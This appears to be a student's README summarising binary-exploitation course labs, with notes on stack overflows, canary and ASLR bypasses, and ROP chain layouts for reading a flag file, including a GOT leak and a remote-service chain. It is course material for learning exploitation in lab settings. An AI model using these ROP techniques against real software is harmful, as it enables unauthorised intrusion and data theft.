# cs6265
# Lab01 GDB
Examining memory
Looking at registers, finding password in memory

# Lab02 Shellcode
Ghidra, writing our own vulnerabilites in shellcode and running against a program that executed them.

# Lab03 Stack Overflow
Creating a stack overflow to gain control of the stack pointer.
Redirect control flow to what we want. We found addresses using `readelf` or `binaryNinja`.

# Lab04 Stack Canaries
Stack canaries were introduced. We could no longer simply overwrite the `$eip` register. Binaries were compiled to protect against this. There are several ways to bypass:

1. Return to libc
1. Predict the canary

# Lab05 String Format Vulnerability
`printf` has a vulnerability in it. 

Learning about ASLR and how to get past it with a string format leak.
Print the addr, find difference to find the base. Call `start` again.

# Lab06 Return to Libc
Using ROP to load pre-existing functions into memory for both 32 bit architecture and 64 bit architectures. Note that the target was compiled using seccomp. This is a security facility in the linux kernal that only allows systme calls consisting of `exit()`, `sigreturn()`, `read()`, and `write()`.

This application leaked function address. I was able to parse and use the leak to summon `/bin/sh` and make system calls.

For the 32bit arch:
```
[buf      ]
[.....    ]
[ra       ] -> 1) open
[pop2     ] --------------------> pop/pop/ret
[arg1     ] -> "/proc/flag"
[arg2     ] -> 0 (O_RDONLY)
[ra       ] -> 2) read
[pop3     ] ------------------> pop/pop/pop/ret
[arg1     ] -> 3 (new fd)
[arg2     ] -> tmp
[arg3     ] -> 1024
[ra       ] -> 3) write
[dummy    ]
[arg1     ] -> 1 (stdout)
[arg2     ] -> tmp
[arg3     ] -> 1040
```

64bit architecture was a bit tougher. The address was not leaked for us. We needed to leak it ourselves using something like the following ROP chain:

```
[buf  ]
[.....]
[ra   ] -> pop rdi; ret
[arg1 ] -> puts@got
[ra   ] -> puts@plt
[ra   ] -> start
```

For 64bit arch:
```
[buf  ]
[.....]
[ra   ] -> pop rdi; ret
[arg1 ] -> "anystring in target" -> symbolic linked to flag
[ra   ] -> pop rsi; pop r15; ret
[arg2 ] -> 0
[dummy] (r15)
[ra   ] -> open()

[ra   ] -> pop rdi; ret
[arg1 ] -> 3
[ra   ] -> pop rsi; pop r15; ret
[arg2 ] -> tmp
[dummy] (r15)
[ra   ] -> pop rdx; ret
[arg3 ] -> 1040
[ra   ] -> read()

[ra   ] -> pop rdi; ret
[arg1 ] -> 1
[ra   ] -> pop rsi; pop r15; ret
[arg2 ] -> tmp
[dummy] (r15)
[ra   ] -> pop rdx; ret
[arg3 ] -> 1040
[ra   ] -> write()
```

Testing was done using a combination of `strace`, `gdb`, and pwntools. See the [tutorial page](https://tc.gts3.org/cs6265/2020-spring/tut/tut06-02-advrop.html) for more information.

# Lab07 ROP against remote service
Used netcat to connect to a server. Server plays rock, paper, scissors. Program uses `libc`'s random generator with the current time as the seed. We imported C's libc library into our script and predicted the correct output. Needed the correct output 5 times in a row to capture the flag.

Used ROP against a remote service. The difficulty here was that we didn't have access to the filesystem. This meant that we need to input our own path to the string using ROP. There were two options for this:

The first involved finding a combination of our strings in memory and using memset to write them somewhere writable. The second option involved calling `read()` on stdin. In our script, we then input the path to the flag. Our ROP chain looked something like this:

```
// Leak address of got.puts. Use this to find base.
popRdi
target.got.puts
target.plt.puts     // print addr of target.got.puts
target.symbols.start

// Read stdin for our new path. Path is written to tmp2
libc.symbols.read(0, tmp2, 256)
popRdi
tmp2                // print tmp2
target.plt.puts
target.symbols.start

// Open tmp2, read it in, write contents to stdout
libc.symbols.open(tmp2, 0)
libc.symbols.read(3, tmp, 1040)
libc.symbols.write(1, tmp, 1040)
```

# Lab08 Reliable exploit

